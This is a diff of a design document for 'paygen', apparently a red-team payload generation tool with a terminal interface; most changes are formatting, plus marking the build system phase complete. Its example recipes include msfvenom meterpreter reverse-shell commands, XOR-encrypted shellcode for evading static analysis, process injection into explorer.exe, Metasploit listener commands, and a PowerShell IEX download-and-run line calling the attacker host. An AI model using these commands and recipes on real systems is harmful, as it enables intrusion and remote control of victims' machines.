@@ -99,12 +99,12 @@ preprocessors_dir: "~/Documents/Tools/paygen/preprocessors"
 output_dir: "~/Documents/Tools/paygen/output"
 
 # TUI preferences
-theme: "catppuccin_mocha"  # Color scheme
+theme: "catppuccin_mocha" # Color scheme
 transparent_background: true
 
 # Build preferences
-keep_source_files: false  # If true, save rendered source code alongside compiled binaries
-show_build_debug: false   # If true, show real-time command output in build popup
+keep_source_files: false # If true, save rendered source code alongside compiled binaries
+show_build_debug: false # If true, show real-time command output in build popup
 ```
 
 ### Configuration Initialization
@@ -133,17 +133,17 @@ All recipes follow this standardized structure with four main sections:
 # Section 1: Meta - Recipe metadata
 meta:
   name: "Recipe Name"
-  category: "Process Injection"  # Freeform category (defaults to "Misc" if omitted)
+  category: "Process Injection" # Freeform category (defaults to "Misc" if omitted)
   description: |
     Multi-line description of what this payload does,
     its effectiveness, and use cases.
-  
-  effectiveness: "high"  # low | medium | high
-  
+
+  effectiveness: "high" # low | medium | high
+
   mitre:
     tactic: "TA0005 - Defense Evasion"
     technique: "T1055 - Process Injection"
-  
+
   artifacts:
     - "Artifact 1 that defenders will see"
     - "Artifact 2 for detection"
@@ -156,29 +156,29 @@ parameters:
     description: "Attacker IP address"
     required: true
     default: ""
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port"
     required: true
     default: 4444
-  
+
   - name: "output_file"
     type: "string"
     description: "Output filename"
     required: true
     default: "payload.exe"
-  
+
   - name: "output_path"
     type: "path"
     description: "Output directory path"
     required: true
-    default: "{config.output_dir}"  # Pre-filled from config
+    default: "{config.output_dir}" # Pre-filled from config
 
 # Section 3: Preprocessing - Data transformation before template rendering
 preprocessing:
   # Preprocessing can be a command OR a script
-  
+
   # Option A: Command-based preprocessing
   - type: "command"
     name: "generate_shellcode"
@@ -186,41 +186,41 @@ preprocessing:
       msfvenom -p windows/x64/meterpreter_reverse_tcp \
         LHOST={{ lhost }} LPORT={{ lport }} \
         -f raw
-    output_var: "raw_shellcode"  # Store command output in this variable
-  
+    output_var: "raw_shellcode" # Store command output in this variable
+
   # Option B: Script-based preprocessing
   - type: "script"
     name: "encrypt_shellcode"
-    script: "preprocessors/xor_encrypt.py"  # Path relative to preprocessors_dir
+    script: "preprocessors/xor_encrypt.py" # Path relative to preprocessors_dir
     args:
       input: "{{ raw_shellcode }}"
-      key: "auto"  # Can be auto-generated or user-specified
-    output_var: "encrypted_shellcode"  # Script output stored here
+      key: "auto" # Can be auto-generated or user-specified
+    output_var: "encrypted_shellcode" # Script output stored here
 
 # Section 4: Output - Template and compilation/execution
 output:
   # For template-based recipes
-  type: "template"  # template | command
+  type: "template" # template | command
   template: "payloads/process_injection/process_injection.cs"
-  
+
   # OR for command-based recipes
   # type: "command"
   # command: |
   #   sliver-server generate --http {{ c2_address }} --save {{ output_path }}/{{ output_file }}
-  
+
   # Compilation (optional, only for template-based)
   compile:
     enabled: true
-    compiler: "mcs"  # mcs, csc, gcc, x86_64-w64-mingw32-gcc, etc.
+    compiler: "mcs" # mcs, csc, gcc, x86_64-w64-mingw32-gcc, etc.
     flags: ["-out:{{ output_path }}/{{ output_file }}"]
-  
+
   # Launch instructions shown to user after generation
   launch_instructions: |
     Execute the payload on the target:
-    
+
     # Method 1: Direct execution
     {{ output_file }}
-    
+
     # Method 2: Remote execution
     IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')
 ```
@@ -237,13 +237,13 @@ meta:
     Injects encrypted shellcode into a remote process using C#.
     Uses XOR encryption to evade static analysis.
     Targets Windows x64 systems.
-  
+
   effectiveness: "high"
-  
+
   mitre:
     tactic: "TA0005 - Defense Evasion"
     technique: "T1055 - Process Injection"
-  
+
   artifacts:
     - "Process creation with PROCESS_ALL_ACCESS"
     - "VirtualAllocEx and WriteProcessMemory API calls"
@@ -256,30 +256,30 @@ parameters:
     description: "Target process name (e.g., explorer.exe)"
     required: true
     default: "explorer.exe"
-  
+
   - name: "lhost"
     type: "ip"
     description: "Listener IP address"
     required: true
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port"
     required: true
     default: 4444
-  
+
   - name: "xor_key"
     type: "hex"
     description: "XOR encryption key (auto-generated if empty)"
     required: false
     default: ""
-  
+
   - name: "output_file"
     type: "string"
     description: "Output filename"
     required: true
     default: "injector.exe"
-  
+
   - name: "output_path"
     type: "path"
     description: "Output directory"
@@ -295,31 +295,31 @@ preprocessing:
         LHOST={{ lhost }} LPORT={{ lport }} \
         -f raw
     output_var: "raw_shellcode"
-  
+
   # Step 2: Encrypt shellcode with custom XOR script
   - type: "script"
     name: "xor_encryption"
     script: "preprocessors/xor_encrypt.py"
     args:
       shellcode: "{{ raw_shellcode }}"
-      key: "{{ xor_key }}"  # Auto-generated if empty
+      key: "{{ xor_key }}" # Auto-generated if empty
     output_var: "encrypted_data"
 
 output:
   type: "template"
   template: "payloads/process_injection/process_injection.cs"
-  
+
   compile:
     enabled: true
     compiler: "mcs"
     flags:
       - "-out:{{ output_path }}/{{ output_file }}"
       - "-platform:x64"
-  
+
   launch_instructions: |
     Start Metasploit listener:
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
-    
+
     Execute on target:
     {{ output_file }} {{ target_process }}
 ```
@@ -336,13 +336,13 @@ meta:
     Generates reverse shell payloads using msfvenom.
     Supports multiple formats and encoding options.
     Medium effectiveness due to known signatures.
-  
+
   effectiveness: "medium"
-  
+
   mitre:
     tactic: "TA0002 - Execution"
     technique: "T1059.003 - Windows Command Shell"
-  
+
   artifacts:
     - "Metasploit framework signatures"
     - "Outbound connection to LHOST:LPORT"
@@ -353,13 +353,13 @@ parameters:
     type: "ip"
     description: "Listener IP address"
     required: true
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port"
     required: true
     default: 4444
-  
+
   - name: "payload_type"
     type: "choice"
     description: "Msfvenom payload type"
@@ -369,34 +369,34 @@ parameters:
       - "windows/x64/shell_reverse_tcp"
       - "linux/x64/shell_reverse_tcp"
     default: "windows/x64/meterpreter_reverse_tcp"
-  
+
   - name: "format"
     type: "choice"
     description: "Output format"
     required: true
     choices: ["exe", "dll", "raw", "ps1", "python"]
     default: "exe"
-  
+
   - name: "encoder"
     type: "choice"
     description: "Encoder for evasion"
     required: false
     choices: ["none", "x86/shikata_ga_nai", "x64/xor_dynamic"]
     default: "none"
-  
+
   - name: "output_file"
     type: "string"
     description: "Output filename"
     required: true
     default: "payload.exe"
-  
+
   - name: "output_path"
     type: "path"
     description: "Output directory"
     required: true
     default: "{config.output_dir}"
 
-preprocessing: []  # No preprocessing needed
+preprocessing: [] # No preprocessing needed
 
 output:
   type: "command"
@@ -406,11 +406,11 @@ output:
       {% if encoder != 'none' %}-e {{ encoder }} -i 3{% endif %} \
       -f {{ format }} \
       -o {{ output_path }}/{{ output_file }}
-  
+
   launch_instructions: |
     Start Metasploit listener:
     msfconsole -q -x "use exploit/multi/handler; set payload {{ payload_type }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
-    
+
     Execute payload on target:
     {{ output_file }}
 ```
@@ -436,7 +436,7 @@ preprocessing:
       msfvenom -p windows/x64/meterpreter_reverse_tcp \
         LHOST={{ lhost }} LPORT={{ lport }} \
         -f raw
-    output_var: "shellcode"  # Output stored in this variable
+    output_var: "shellcode" # Output stored in this variable
 ```
 
 - Command uses Jinja2 templating with parameter values
@@ -495,16 +495,16 @@ def main():
     if len(sys.argv) > 1:
         input_data = sys.argv[1]
         key = sys.argv[2] if len(sys.argv) > 2 else None
-    
+
     # Option 2: Read JSON from stdin
     else:
         args = json.load(sys.stdin)
         input_data = args.get('input')
         key = args.get('key')
-    
+
     # Process the data
     result = process(input_data, key)
-    
+
     # Output to stdout (will be captured by paygen)
     print(result)
 
@@ -531,17 +531,17 @@ if __name__ == "__main__":
 
 ## Parameter Types & Validation
 
-| Type      | Validation                | Example                   |
-| --------- | ------------------------- | ------------------------- |
-| `ip`      | IPv4/IPv6 format          | `192.168.1.100`           |
-| `port`    | 1-65535 range             | `4444`                    |
-| `string`  | Any text                  | `payload.exe`             |
-| `file`    | Path exists (validation)  | `/tmp/shellcode.bin`      |
-| `path`    | Directory path            | `./output`                |
-| `hex`     | Hexadecimal string        | `deadbeef`                |
-| `bool`    | true/false                | `true`                    |
-| `choice`  | One from predefined list  | `exe` from [exe,dll,raw]  |
-| `integer` | Whole number with range   | `5` (range: [1, 10])      |
+| Type      | Validation               | Example                  |
+| --------- | ------------------------ | ------------------------ |
+| `ip`      | IPv4/IPv6 format         | `192.168.1.100`          |
+| `port`    | 1-65535 range            | `4444`                   |
+| `string`  | Any text                 | `payload.exe`            |
+| `file`    | Path exists (validation) | `/tmp/shellcode.bin`     |
+| `path`    | Directory path           | `./output`               |
+| `hex`     | Hexadecimal string       | `deadbeef`               |
+| `bool`    | true/false               | `true`                   |
+| `choice`  | One from predefined list | `exe` from [exe,dll,raw] |
+| `integer` | Whole number with range  | `5` (range: [1, 10])     |
 
 ---
 
@@ -549,7 +549,7 @@ if __name__ == "__main__":
 
 ### Layout (3-Panel Design)
 
-```
+````
 ┌──────────────────────────────────────────────────────────────────────┐
 │  PAYGEN - Payload Generation Framework                              │
 │  Recipes: 15 | Categories: 5                                         │
@@ -579,7 +579,7 @@ if __name__ == "__main__":
 │   [G] Generate  │                          │  [TAB] Switch Panel      │
 │   [?] Help      │  [ENTER] Configure       │  [↑↓] Scroll             │
 └─────────────────┴──────────────────────────┴──────────────────────────┘
-```
+````
 
 ### Color Scheme: Catppuccin Mocha
 
@@ -593,25 +593,25 @@ COLORS = {
     'red': '#f38ba8',        # Errors, high effectiveness
     'maroon': '#eba0ac',
     'peach': '#fab387',      # Warnings, medium effectiveness
-    'yellow': '#f9e2af',     
+    'yellow': '#f9e2af',
     'green': '#a6e3a1',      # Success, high effectiveness
     'teal': '#94e2d5',       # Info
     'sky': '#89dceb',
     'sapphire': '#74c7ec',
     'blue': '#89b4fa',       # Links, selections
-    'lavender': '#b4befe',   
+    'lavender': '#b4befe',
     'text': '#cdd6f4',       # Primary text
     'subtext1': '#bac2de',   # Secondary text
-    'subtext0': '#a6adc8',   
-    'overlay2': '#9399b2',   
-    'overlay1': '#7f849c',   
-    'overlay0': '#6c7086',   
-    'surface2': '#585b70',   
-    'surface1': '#45475a',   
-    'surface0': '#313244',   
+    'subtext0': '#a6adc8',
+    'overlay2': '#9399b2',
+    'overlay1': '#7f849c',
+    'overlay0': '#6c7086',
+    'surface2': '#585b70',
+    'surface1': '#45475a',
+    'surface0': '#313244',
     'base': '#1e1e2e',       # Background (or transparent)
-    'mantle': '#181825',     
-    'crust': '#11111b',      
+    'mantle': '#181825',
+    'crust': '#11111b',
 }
 
 # Usage
@@ -631,6 +631,7 @@ COLORS = {
 ### Navigation & Keybindings
 
 **Global**
+
 - `j`/`k`: Navigate down/up
 - `h`/`l` or `Tab`: Switch between panels (left/right)
 - `Enter`: Select/Activate
@@ -640,6 +641,7 @@ COLORS = {
 - `q`: Quit
 
 **Left Panel (Categories & Recipes)**
+
 - `j`/`k`: Navigate categories or recipes down/up
 - `Enter` or `l`: Expand category or select recipe
 - `/`: Search recipes
@@ -647,6 +649,7 @@ COLORS = {
 - `G`: Jump to bottom
 
 **Middle Panel (Recipe Metadata)**
+
 - `j`/`k`: Scroll down/up
 - `Enter`: Open parameter configuration
 - `v`: View full description
@@ -654,6 +657,7 @@ COLORS = {
 - `G`: Jump to bottom
 
 **Right Panel (Code View)**
+
 - `j`/`k`: Scroll down/up
 - `Ctrl+d`/`Ctrl+u`: Page down/up
 - `gg`: Jump to top
@@ -662,16 +666,19 @@ COLORS = {
 ### User Workflow
 
 1. **Browse Categories** (Left Panel)
+
    - Select a category
    - Categories sorted alphabetically
    - Shows recipe count per category
 
 2. **Browse Recipes** (Left Panel)
+
    - Recipes sorted by effectiveness (HIGH → MEDIUM → LOW)
    - Then alphabetically within same effectiveness
    - Effectiveness badge color-coded
 
 3. **View Recipe Details** (Middle Panel)
+
    - Name, category, description
    - Effectiveness rating
    - MITRE ATT&CK mapping
@@ -680,11 +687,13 @@ COLORS = {
    - Launch instructions preview
 
 4. **View Source Code** (Right Panel)
+
    - For template recipes: Shows the actual template code
    - For command recipes: Shows the command that will be executed
    - Syntax highlighting based on file type
 
 5. **Configure & Generate** (Parameter Input Screen)
+
    - Press `Enter` on a recipe or `g` anywhere
    - Fill in required parameters
    - Optional parameters have defaults pre-filled
@@ -758,6 +767,7 @@ COLORS = {
 ### Phase 4: Parameter Configuration & UI Transitions ✅ COMPLETE
 
 **Layout Design:**
+
 - When user presses 'g', a centered popup widget appears overlaying the main 3-panel view
 - Background panels remain visible with semi-transparent overlay effect
 - Popup is dynamically centered based on screen dimensions
@@ -765,6 +775,7 @@ COLORS = {
 - Popup automatically focuses first input field on open
 
 **Parameter Configuration UI (Popup Widget):**
+
 - [x] Create parameter configuration popup widget (Widget-based, not Screen)
 - [x] Implement parameter input widgets by type:
   - [x] Text input for string, ip, port, path, hex
@@ -773,7 +784,7 @@ COLORS = {
   - [x] Number input for integer type with range validation
 - [x] Pre-fill defaults from recipe and config
 - [x] Real-time validation with error messages (IP, port, path, hex, integer)
-- [x] Required field indicators (*)
+- [x] Required field indicators (\*)
 - [x] "Generate" button with Catppuccin green styling (#a6e3a1)
 - [x] Removed Cancel button - using keyboard shortcuts instead
 - [x] Widget overlay system with ParameterConfigPopup
@@ -787,11 +798,13 @@ COLORS = {
 - [x] Layer: overlay for proper z-ordering
 
 **Testing:**
+
 - [x] Validation tests for IP, port, hex, path types
 - [x] Integration test with recipe loading and parameter resolution
 - [x] Config placeholder resolution ({config.output_dir} → actual path)
 
 **Technical Implementation Notes:**
+
 - Popup is a Widget (not Screen/ModalScreen) to allow background visibility
 - Position calculated dynamically: `left_offset = (screen_width - popup_width) // 2`
 - Vertical centering via CSS: `offset-y: 50%; margin-top: -15;`
@@ -801,116 +814,110 @@ COLORS = {
 - Generate handler: Posts `GenerateRequested` message with params, then removes widget
 
 **Files Created/Modified:**
+
 - `src/tui/param_config_panel.py` - Popup widget for parameter configuration
 - `src/tui/app.py` - Added action_generate() with dynamic centering and widget mounting
 - `src/core/validator.py` - Complete validation for all parameter types
 - `test_validation.py` - Validation test suite
 - `test_phase4_integration.py` - Integration test for Phase 4
 
-### Phase 5: Build System & Payload Generation
+### Phase 5: Build System & Payload Generation ✅ COMPLETE
 
 **Build Orchestrator:**
-- [ ] Implement payload builder orchestrator
-- [ ] Execute preprocessing steps in sequence
-  - [ ] Command execution (e.g., msfvenom)
-  - [ ] Script execution (e.g., xor_encrypt.py, aes_encrypt.py)
-  - [ ] Variable management across steps
-- [ ] Template rendering with all variables (parameters + preprocessing outputs)
-- [ ] Implement compilation support:
-  - [ ] C/C++ compilation (gcc, mingw-w64)
-  - [ ] C# compilation (mcs, csc)
-  - [ ] Other compilers as needed
-- [ ] Command execution for command-based recipes
-- [ ] Output file management:
-  - [ ] Save compiled binary to output directory
-  - [ ] Optionally save rendered source code (if `keep_source_files: true` in config)
-  - [ ] For command-based recipes: just execute the command
+
+- [x] Implement payload builder orchestrator (`PayloadBuilder` class)
+- [x] Execute preprocessing steps in sequence
+  - [x] Command execution (e.g., msfvenom) - captures stdout as bytes
+  - [x] Script execution (e.g., xor_encrypt.py, aes_encrypt.py) - JSON or raw output
+  - [x] Variable management across steps - stored in `self.variables`
+- [x] Template rendering with all variables (parameters + preprocessing outputs)
+  - [x] Custom Jinja2 environment with base64 filter for bytes
+  - [x] Config variables injected (output_dir, recipes_dir, etc.)
+- [x] Implement compilation support:
+  - [x] C/C++ compilation (gcc, mingw-w64)
+  - [x] C# compilation (mcs, csc)
+  - [x] Generic compiler support with Jinja2-rendered flags
+  - [x] 5-minute timeout for compilation
+  - [x] Compiler detection and error messages
+- [x] Command execution for command-based recipes
+- [x] Output file management:
+  - [x] Save compiled binary to output directory
+  - [x] Optionally save rendered source code (if `keep_source_files: true` in config)
+  - [x] For command-based recipes: execute command and verify output file
+  - [x] File verification with fallback search for alternative filenames
 
 **Build Progress Popup (Widget Overlay):**
-- [ ] Create BuildProgressPopup widget (similar to ParameterConfigPopup)
-- [ ] After pressing "Generate" in parameter popup:
-  - [ ] Parameter popup closes
-  - [ ] BuildProgressPopup appears (centered, overlay on background panels)
-- [ ] Display real-time build progress:
-  - [ ] Step indicators: "🔄 Step 1/3: Generating shellcode..."
-  - [ ] Spinner animation during execution
-  - [ ] If `show_build_debug: true` in config:
-    - [ ] Show real-time command output (stdout/stderr)
-    - [ ] Scrollable debug log area
-  - [ ] If `show_build_debug: false`:
-    - [ ] Only show step name and spinner (cleaner view)
-- [ ] Color-coded step completion:
-  - [ ] "✅ Step 1/3: Shellcode generated" (green)
-  - [ ] "🔄 Step 2/3: Encrypting..." (blue/teal)
-  - [ ] "❌ Step 2/3: Encryption failed" (red)
-- [ ] On successful build:
-  - [ ] Show success message with output file info
-  - [ ] Display file path and size
-  - [ ] Show filled-in launch instructions from recipe
-  - [ ] Prompt: "Press Enter to close"
-- [ ] On build failure:
-  - [ ] Show error message with failed step
-  - [ ] Display error output/logs
-  - [ ] Prompt: "Press Enter to close"
-- [ ] Keyboard:
-  - [ ] Enter: Close popup and return to browsing
-  - [ ] Cannot dismiss with 'q' or 'Esc' during build (must wait)
-  - [ ] Can dismiss with 'q' or 'Esc' after build completes
 
-**Build Popup UI Design:**
-```
-┌──────────────────────────────────────────────┐
-│ Building: C# Process Injection              │
-├──────────────────────────────────────────────┤
-│                                              │
-│ ✅ Step 1/3: Generating shellcode           │
-│    msfvenom -p windows/x64/...              │
-│                                              │
-│ 🔄 Step 2/3: Encrypting shellcode...        │
-│    [spinner]                                 │
-│    [debug output if enabled]                 │
-│                                              │
-│ ⏳ Step 3/3: Compiling C# code...           │
-│                                              │
-│ ──────────────────────────────────────────  │
-│ [After success:]                             │
-│                                              │
-│ ✅ Build Successful!                        │
-│                                              │
-│ Output: /output/injector.exe (45.2 KB)      │
-│ Source: /output/injector.cs (saved)         │
-│                                              │
-│ Launch Instructions:                         │
-│ ┌────────────────────────────────────────┐  │
-│ │ Start Metasploit listener:             │  │
-│ │ msfconsole -q -x "use exploit/..."     │  │
-│ │                                        │  │
-│ │ Execute on target:                     │  │
-│ │ injector.exe explorer.exe              │  │
-│ └────────────────────────────────────────┘  │
-│                                              │
-│          [Press Enter to close]              │
-└──────────────────────────────────────────────┘
-```
+- [x] Create BuildProgressPopup widget (similar to ParameterConfigPopup)
+- [x] After pressing "Generate" in parameter popup:
+  - [x] Parameter popup closes
+  - [x] BuildProgressPopup appears (centered overlay - width=70, height=30)
+- [x] Display real-time build progress:
+  - [x] Step indicators: "🔄 Preprocessing 1/3: generate_shellcode..."
+  - [x] Spinner animation during execution (4 frames: ⠋⠙⠹⠸, 100ms updates)
+  - [x] Show real-time step output (first 10 lines, truncated for performance)
+  - [x] Scrollable output area with auto-scroll to bottom
+  - [x] Status icons: ⏳ pending, 🔄 running, ✅ success, ❌ failed
+- [x] Color-coded step completion:
+  - [x] Success: green (✅)
+  - [x] Running: spinner with blue/teal
+  - [x] Failed: red (❌) with error messages
+- [x] On successful build:
+  - [x] Show success message with output file info
+  - [x] Display file path and size (formatted: KB/MB with spaces, e.g., "3.1 MB")
+  - [x] Render and show launch instructions (Jinja2 template with all variables)
+  - [x] Prompt: "Press Enter to close" (visible at bottom)
+- [x] On build failure:
+  - [x] Show error message with failed step
+  - [x] Display error output/logs (first 10 lines)
+  - [x] Prompt: "Press Enter to close"
+- [x] Keyboard:
+  - [x] Enter: Close popup and return to browsing
+  - [x] Can only close with Enter when build is complete (`is_complete` flag)
+  - [x] Posts `BuildComplete` message on close
 
-**Technical Implementation:**
-- [ ] BuildProgressPopup as Widget (not Screen) for overlay
-- [ ] Dynamic centering like ParameterConfigPopup
-- [ ] Streaming output capture from commands/scripts
-- [ ] Progress tracking state machine:
-  - [ ] pending → running → success/failed for each step
-- [ ] Launch instructions Jinja2 rendering with final parameters
-- [ ] File size calculation for output files
-- [ ] Error log formatting and display
+**Implementation Details:**
 
-**Files to Create:**
-- `src/tui/build_progress_popup.py` - Build progress widget
-- `src/core/payload_builder.py` - Build orchestrator
-- `src/core/compiler.py` - Compilation utilities
+- [x] BuildProgressPopup as Widget (not Screen) for overlay
+- [x] Fixed size: width=70, height=30 (optimized for laptop screens)
+- [x] Dynamic centering: calculated in app.py based on screen dimensions
+- [x] Async progress updates via `set_progress_callback()` in PayloadBuilder
+- [x] Progress tracking state machine:
+  - [x] BuildStep class: name, type, status (pending/running/success/failed), output, error
+  - [x] Steps list maintained throughout build process
+- [x] Launch instructions Jinja2 rendering with final parameters in PayloadBuilder
+- [x] File size calculation with `os.path.getsize()` and formatted output
+- [x] Error log formatting with color coding (red for errors)
+- [x] Output widget with VerticalScroll container for long output
+
+**Additional Features Implemented:**
+
+- [x] Base64 filter for Jinja2 templates (for encoding bytes in templates)
+- [x] JSON output parsing from preprocessing scripts
+- [x] Spinner animation timer with 100ms updates
+- [x] Auto-scroll to bottom in output area
+- [x] Output line limiting (10 lines max per step) to prevent UI lag
+- [x] Rich text markup escaping for output display
+- [x] BuildComplete message for app state management
+- [x] File verification with alternative filename search
+- [x] Proper cleanup of timers on build completion
+
+**Files Created:**
+
+- `src/tui/build_progress_popup.py` - Build progress widget (306 lines)
+- `src/core/payload_builder.py` - Build orchestrator (433 lines)
+- `src/core/compiler.py` - Compilation utilities (113 lines)
+
+**UX Enhancements (Post-Phase 5):**
+
+- [x] Navigation enhancement: Changed from `on_tree_node_selected` to `on_tree_node_highlighted`
+  - Recipe details and code preview update on arrow key navigation (no Enter needed)
+  - More responsive and modern UX
 
 ### Phase 6: History & Session Management
 
 **History System:**
+
 - [ ] Create history data structure
 - [ ] Track all generated payloads:
   - [ ] Recipe name
@@ -923,6 +930,7 @@ COLORS = {
 - [ ] Load history on startup
 
 **History UI:**
+
 - [ ] New keybinding 'H' to open history popup/modal
 - [ ] History popup overlays main view (similar to parameter config)
 - [ ] Display history entries (newest first):
@@ -943,6 +951,7 @@ COLORS = {
 - [ ] 'q' or 'Esc' to close history popup
 
 **Notes:**
+
 - History popup similar to parameter config popup (centered widget overlay)
 - Keep consistent UI/UX with overlay approach
 - Background panels remain visible
